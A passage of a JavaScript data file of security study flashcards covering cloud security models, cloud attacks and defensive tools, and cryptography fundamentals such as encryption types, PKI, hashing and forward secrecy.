                        { q: "Shared Responsibility Model?", a: "Provider: infrastructure, physical security, hypervisor/Customer: data, access management, OS config, applications/IaaS: customer manages more (OS, apps, data)/SaaS: provider manages more (apps, runtime, OS)" },
                        { q: "Securing cloud storage?", a: "Disable public access by default/Encrypt at rest + in transit/Least-privilege IAM/Versioning + logs/Presigned URLs for temp access/Bucket policy audits/AWS S3 Block Public Access, MFA Delete" }
                    ]
                },
                {
                    title: "Cloud Attacks & Security Frameworks",
                    cards: [
                        { q: "Cloud-specific attacks?", a: "Credential stuffing on cloud logins/API key exposure (GitHub/public repos)/IMDS: SSRF to 169.254.169.254, steal temp IAM creds/Cross-tenant isolation attacks/Container escape (Docker/Kubernetes)" },
                        { q: "Cloud cryptojacking?", a: "Unauthorized cryptomining on cloud resources; detect via unusual CPU/billing patterns/Monitor + alert usage, least-privilege IAM, container scanning, cost audits" },
                        { q: "Cloud security tools?", a: "AWS: Config, GuardDuty, Inspector, Macie, Security Hub/Azure: Security Center, Defender for Cloud, Policy/Google: Security Command Center, Cloud Security Scanner/Third-party: Prisma Cloud, Dome9, Wiz, Lacework/Open source: Prowler (AWS), Cloudsplaining (IAM)" },
                        { q: "CIS Benchmark for Cloud?", a: "Center for Internet Security cloud config benchmarks—AWS, Azure, GCP Foundation Benchmarks; security config best practices; automated compliance checking" }
                    ]
                },
                {
                    title: "Cloud Computing Overview",
                    cards: [
                        { q: "Cloud service models (list)?", a: "1) IaaS—VMs, storage, networking/2) PaaS—dev platforms/3) SaaS—apps over internet/4) FaaS—serverless" },
                        { q: "Cloud deployment models (list)?", a: "1) Public—shared (AWS, Azure, GCP)/2) Private—dedicated/3) Hybrid—public + private/4) Community—shared by orgs w/ common concerns" },
                        { q: "Common cloud security risks?", a: "1) Data breaches/2) Insecure APIs/3) Misconfigured storage (S3)/4) Account hijacking/5) Shared technology vulns/6) Insufficient identity management/7) Compliance + legal issues" },
                        { q: "Securing cloud environments?", a: "1) MFA everywhere/2) Encrypt at rest + in transit/3) Least privilege/4) Regular audits/5) CSPM tools/6) Monitor logs + activity" }
                    ]
                }
            ]
        },
        {
            id: 20,
            title: "Cryptography",
            sections: [
                {
                    title: "Cryptography Fundamentals",
                    cards: [
                        { q: "Cryptography—core definition?", a: "Secure communication: plaintext→ciphertext/Goals: confidentiality, integrity, authentication, non-repudiation" },
                        { q: "Encryption types (detailed)?", a: "Symmetric: same key enc/dec (AES, DES, 3DES, RC4, Blowfish)/Asymmetric: public/private pairs (RSA, ECC, Diffie-Hellman)/Hash: one-way (MD5, SHA-1, SHA-256, SHA-512)" },
                        { q: "PKI—components?", a: "Manage digital certificates + public-key encryption/Certificate Authority (CA), Registration Authority (RA), Digital Certificates, CRL, Certificate Revocation" },
                        { q: "Digital signature—how it works?", a: "Verify message authenticity + integrity/Asymmetric: sender encrypts hash w/ private key; receiver decrypts w/ public key" },
                        { q: "Steganography vs cryptography?", a: "Hide secret data inside non-secret files (images, audio, video)/Cryptography hides content; steganography hides the message's existence" },
                        { q: "HMAC?", a: "Hash-based Message Authentication Code; hash + secret key→integrity + authentication/IPsec, TLS, API auth" },
                        { q: "Forward Secrecy?", a: "Compromised long-term keys don't break past session keys; comms stay secure even if server private key stolen/ECDHE (Elliptic Curve Diffie-Hellman Key Exchange) provides it" },
                        { q: "Common hash functions + weaknesses?", a: "MD5: 128-bit, broken (collisions)/SHA-1: 160-bit, deprecated (SHAttered attack 2017)/SHA-256: 256-bit, secure (SHA-2)/SHA-512: 512-bit, secure/BLAKE3: modern, fast/Password hashing: bcrypt, scrypt, Argon2 (memory-hard)" }
                    ]
                },
                {
                    title: "Advanced Cryptography",
                    cards: [
                        { q: "Digital certificate?", a: "Electronic 'passport' binding recognized identity to a public key; issued by CA/X.509 format/Subject, Issuer, Public Key, Validity Period, Serial Number, Signature" },
                        { q: "Diffie-Hellman key exchange?", a: "Exchange keys securely over public channel; shared secret from no prior secrets/Discrete logarithm problem; foundation of many secure protocols" },
                        { q: "Quantum computing threat to cryptography?", a: "Quantum computers could break RSA + ECC; Shor's algorithm factors large numbers fast/NIST standardizing post-quantum—lattice-based, hash-based, code-based/10-30 years to practical attacks" },
                        { q: "Perfect Forward Secrecy (PFS)?", a: "Long-term private key compromise→past session keys stay secure/Unique ephemeral keys per session; ECDHE in TLS/Blocks mass surveillance from stored data" }
                    ]
                },
                {
                    title: "Cryptography Overview",
                    cards: [
                        { q: "Cryptography in one line?", a: "Secure communication: plaintext→ciphertext/Confidentiality, integrity, authentication, non-repudiation" },
                        { q: "Encryption types (list)?", a: "1) Symmetric—same key enc/dec (AES, DES, 3DES, RC4, Blowfish)/2) Asymmetric—public/private pairs (RSA, ECC, Diffie-Hellman)/3) Hash—one-way (MD5, SHA-1, SHA-256, SHA-512)" },
                        { q: "PKI?", a: "Manage digital certificates + public-key encryption/CA, RA, Digital Certificates, CRL, Certificate Revocation" },
                        { q: "Digital signature?", a: "Verify authenticity + integrity; sender encrypts hash w/ private key, receiver decrypts w/ public key" },
                        { q: "Steganography?", a: "Hide secret data in non-secret files (images, audio, video); hides message existence (cryptography hides content)" }
                    ]
                }
            ]
        }
    ]
};
